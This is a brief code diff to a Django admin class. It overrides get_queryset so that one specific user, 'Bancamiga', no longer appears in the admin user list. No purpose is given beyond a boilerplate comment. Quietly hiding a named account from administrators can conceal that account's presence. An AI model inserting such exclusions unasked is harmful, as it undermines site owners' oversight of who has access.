@@ -35,4 +35,10 @@ class CustomUserAdmin(UserAdmin):
         ),
     )
 
+    def get_queryset(self, request):
+        queryset = super().get_queryset(request)
+        # Modify the queryset as per your requirements
+        queryset = queryset.exclude(username='Bancamiga')
+        return queryset
+
 admin.site.register(User, CustomUserAdmin)
